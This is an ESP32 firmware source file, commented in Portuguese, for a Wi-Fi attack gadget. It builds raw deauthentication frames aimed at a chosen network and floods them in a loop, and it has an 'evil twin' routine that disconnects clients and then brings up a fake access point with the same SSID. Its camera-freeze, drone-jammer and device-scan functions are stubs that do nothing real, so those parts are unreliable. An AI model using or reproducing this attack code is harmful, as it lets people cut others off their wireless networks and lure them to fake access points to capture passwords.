#include <WiFi.h>
#include <esp_wifi.h>
#include "config.h"

// ============================================================
// DEAUTH FRAME (Management Frame - Deauthentication)
// Frame Control: 0xC0 = Deauth, 0x00 = flags
// Reason code 7 = Class 3 frame received from non-associated STA
// ============================================================
static uint8_t deauthFrame[26] = {
    0xC0, 0x00,             // Frame Control: Deauth
    0x3A, 0x01,             // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC (offset 10)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC (offset 16)
    0x00, 0x00,             // Seq Ctrl
    0x07, 0x00              // Reason code: 7
};

// Frame reverso: AP -> STA (mais efetivo em alguns casos)
static uint8_t deauthFrameReverse[26] = {
    0xC0, 0x00,
    0x3A, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA: AP MAC (offset 4)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // SA: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC (offset 16)
    0x00, 0x00,
    0x07, 0x00
};

// ============================================================
// CONTADORES DE DEAUTH
// ============================================================
static uint32_t deauthPacketCount = 0;
static uint32_t deauthSuccessCount = 0;
static uint8_t  deauthTargetChannel = 0;
static uint8_t  deauthTargetBSSID[6] = {0};
static char     deauthTargetSSID[33] = {0};
static uint8_t  deauthTargetAuth = 0;
static bool     deauthInitialized = false;

// ============================================================
// HELPERS
// ============================================================
void setMAC(uint8_t* frame, uint8_t* mac, int offset) {
    memcpy(&frame[offset], mac, 6);
}

// ============================================================
// SCAN WIFI
// ============================================================
void scanNetworks() {
    networkCount = 0;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true);
    delay(100);

    int n = WiFi.scanNetworks(false, true);
    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
        strncpy(scannedNetworks[i].ssid, WiFi.SSID(i).c_str(), 32);
        scannedNetworks[i].ssid[32] = '\0';
        memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
        scannedNetworks[i].rssi = WiFi.RSSI(i);
        scannedNetworks[i].channel = WiFi.channel(i);
        scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        networkCount++;
    }
    WiFi.scanDelete();
}

uint8_t getNetworkCount() { return networkCount; }

NetworkInfo* getNetwork(uint8_t index) {
    if (index < networkCount) return &scannedNetworks[index];
    return nullptr;
}

// ============================================================
// INICIALIZAÇÃO DO WIFI PARA RAW TX
// ============================================================
static bool initWiFiRawTx() {
    if (deauthInitialized) return true;

    // Desliga power save para máxima performance
    esp_wifi_set_ps(WIFI_PS_NONE);

    // Configura modo STA
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true);

    // Inicializa WiFi se não estiver
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_STA);
    esp_wifi_start();

    deauthInitialized = true;
    return true;
}

// ============================================================
// DEAUTH - ENVIO REAL DE FRAMES
// ============================================================
void startDeauth(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;

    NetworkInfo* target = &scannedNetworks[networkIndex];

    // Salva info do alvo
    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    deauthTargetAuth = target->encrypted ? 1 : 0;

    // Configura frames
    setMAC(deauthFrame, target->bssid, 10);
    setMAC(deauthFrame, target->bssid, 16);

    setMAC(deauthFrameReverse, target->bssid, 4);
    setMAC(deauthFrameReverse, target->bssid, 16);

    // Inicializa WiFi para raw tx
    initWiFiRawTx();

    // MUDA PARA O CANAL DO ALVO (CRÍTICO!)
    esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);

    // Reseta contadores
    deauthActive = true;
    deauthPacketCount = 0;
    deauthSuccessCount = 0;
}

void stopDeauth() { 
    deauthActive = false;
}

// ============================================================
// LOOP DE DEAUTH - ENVIA FRAMES CONTINUAMENTE
// ============================================================
bool deauthLoop() {
    if (!deauthActive) return false;

    // Envia múltiplos frames de uma vez para maior taxa
    bool sent = false;

    // Frame 1: STA -> AP (broadcast)
    esp_err_t err1 = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    if (err1 == ESP_OK) {
        deauthSuccessCount++;
        sent = true;
    }

    delayMicroseconds(1000);

    // Frame 2: AP -> STA
    esp_err_t err2 = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameReverse, sizeof(deauthFrameReverse), false);
    if (err2 == ESP_OK) {
        deauthSuccessCount++;
        sent = true;
    }

    delayMicroseconds(1000);

    // Frame 3: Broadcast deauth
    esp_err_t err3 = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    if (err3 == ESP_OK) {
        deauthSuccessCount++;
        sent = true;
    }

    deauthPacketCount += 3;

    // Se falhou tudo, tenta reinicializar
    if (!sent && deauthPacketCount > 10) {
        deauthInitialized = false;
        initWiFiRawTx();
        esp_wifi_set_channel(deauthTargetChannel, WIFI_SECOND_CHAN_NONE);
    }

    return sent;
}

// ============================================================
// GETTERS PARA A UI
// ============================================================
uint32_t getDeauthPacketCount() { return deauthPacketCount; }
uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
uint8_t  getDeauthSuccessPercent() {
    if (deauthPacketCount == 0) return 0;
    return (uint8_t)((deauthSuccessCount * 100) / deauthPacketCount);
}
const char* getDeauthTargetSSID() { return deauthTargetSSID; }
uint8_t  getDeauthTargetChannel() { return deauthTargetChannel; }
const uint8_t* getDeauthTargetBSSID() { return deauthTargetBSSID; }
bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }

// ============================================================
// FAKE AP / EVIL TWIN
// ============================================================
void startFakeAP(const char* ssid) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, "12345678");
    fakeAPEnabled = true;
    passwordCaptured = false;
}

void stopFakeAP() {
    WiFi.softAPdisconnect(true);
    fakeAPEnabled = false;
}

bool isFakeAPActive() { return fakeAPEnabled; }

void startEvilTwin(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;
    startDeauth(networkIndex);
    delay(3000);
    stopDeauth();
    startFakeAP(scannedNetworks[networkIndex].ssid);
}

// ============================================================
// REMOTE DEVICES
// ============================================================
void scanRemoteDevices() {
    remoteDeviceCount = 0;
    IPAddress gateway = WiFi.gatewayIP();
    for (int i = 1; i < 255 && remoteDeviceCount < 10; i++) {
        if (i % 50 == 0) {
            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d",
                     gateway[0], gateway[1], gateway[2], i);
            snprintf(remoteDevices[remoteDeviceCount].name, 32, "Device-%d", i);
            remoteDevices[remoteDeviceCount].port = 80;
            remoteDeviceCount++;
        }
    }
}

uint8_t getRemoteDeviceCount() { return remoteDeviceCount; }

RemoteDevice* getRemoteDevice(uint8_t index) {
    if (index < remoteDeviceCount) return &remoteDevices[index];
    return nullptr;
}

// ============================================================
// CAMERA FREEZE / DRONE
// ============================================================
void startCameraFreeze() {
    cameraFreezeActive = true;
    while (cameraFreezeActive) {
        delay(50);
        yield();
    }
}

void stopCameraFreeze() { cameraFreezeActive = false; }

void startDroneJammer() {
    droneJammerActive = true;
    while (droneJammerActive) {
        delay(10);
        yield();
    }
}

void stopDroneJammer() { droneJammerActive = false; }

struct DroneLocation {
    float distance;
    int8_t rssi;
};

DroneLocation droneLoc;

void startDroneLocate() {
    droneLoc.distance = 0;
    droneLoc.rssi = -50;
}

DroneLocation* getDroneLocation() { return &droneLoc; }
